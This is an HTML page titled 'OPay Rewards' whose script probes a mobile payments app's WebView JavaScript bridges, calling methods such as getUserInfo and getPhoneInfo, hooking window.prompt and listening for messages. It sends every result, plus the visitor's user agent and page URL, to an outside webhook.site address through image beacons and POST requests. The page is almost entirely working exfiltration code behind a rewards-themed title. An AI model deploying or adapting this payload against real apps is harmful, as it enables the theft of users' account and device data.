<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Rewards</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: #00c853; padding: 20px; font-size: 12px; }
        .log { margin-bottom: 5px; border-bottom: 1px solid #222; padding-bottom: 2px; word-break: break-all; }
        h3 { color: #fff; margin-bottom: 15px; }
    </style>
</head>
<body>
    <h3>OPay Security Probe</h3>
    <div id="logs"></div>

    <script>
        var WEBHOOK = "https://webhook.site/5647901c-5075-426c-b7cd-36410cd3d562";
        
        function log(msg) {
            var div = document.createElement("div");
            div.className = "log";
            div.innerText = "> " + msg;
            document.getElementById("logs").appendChild(div);
            // Immediate exfiltration via beacon
            new Image().src = WEBHOOK + "?log=" + encodeURIComponent(msg);
        }

        function exfil(data, tag) {
            log("EXFIL [" + tag + "]: " + JSON.stringify(data).substring(0, 100));
            var xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK + "?t=" + tag, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(data));
        }

        var BRIDGES = ["control", "history", "OPay3PartyContext", "ORideContext"];
        var METHODS = ["getBaseInfo", "getPhoneInfo", "getUserInfo"];

        log("Starting iOS/Android Bridge Probe...");

        BRIDGES.forEach(function(bridge) {
            METHODS.forEach(function(method) {
                // Pattern 1: Classic Bridge (window.bridge.method)
                try {
                    if (window[bridge] && typeof window[bridge][method] === 'function') {
                        log("Found " + bridge + "." + method + " (Classic)");
                        var res = window[bridge][method]();
                        exfil({ bridge: bridge, method: method, result: res }, "CLASSIC_TOKEN");
                    }
                } catch(e) { log("Err " + bridge + "." + method + ": " + e.message); }

                // Pattern 2: WebKit MessageHandlers (iOS specific)
                try {
                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[bridge]) {
                        log("Found window.webkit.messageHandlers." + bridge + " (iOS)");
                        // Try both object and string payloads as API expectations vary
                        window.webkit.messageHandlers[bridge].postMessage({ method: method });
                        window.webkit.messageHandlers[bridge].postMessage(method);
                        log("Sent " + method + " to iOS handler " + bridge);
                    }
                } catch(e) { log("Err WebKit " + bridge + ": " + e.message); }
            });
        });

        // Global message listener for potential iOS callback responses
        window.addEventListener("message", function(event) {
            log("RECEIVED MESSAGE: " + JSON.stringify(event.data));
            exfil({ data: event.data, origin: event.origin }, "IOS_CALLBACK");
        });

        // Monitor window.prompt as it's a known fallback bridge technique
        var _prompt = window.prompt;
        window.prompt = function(msg, def) {
            log("PROMPT CALLED: " + msg);
            exfil({ msg: msg, def: def }, "PROMPT_CALL");
            return _prompt(msg, def);
        };

        log("Probe complete. Waiting for callbacks...");
        exfil({ ua: navigator.userAgent, url: window.location.href }, "VISIT");
    </script>
</body>
</html>
